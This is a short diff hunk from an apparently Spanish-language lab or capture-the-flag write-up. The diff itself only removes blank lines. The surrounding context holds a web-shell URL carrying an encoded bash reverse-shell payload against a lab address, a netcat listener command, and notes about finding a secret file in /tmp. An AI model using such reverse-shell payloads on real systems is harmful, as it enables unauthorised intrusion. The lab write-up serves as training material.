@@ -63,8 +63,6 @@ http://172.17.0.2/shell.php?parameter=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev
 nc -lvnp 4444
 ```
 
-
-
 Una vez dentro, recuerdo el secreto de /tmp asi que me dirijo ahi y encuentro un secreto.txt
 
 ![](assets/2025-10-27-20-16-05-image.png)
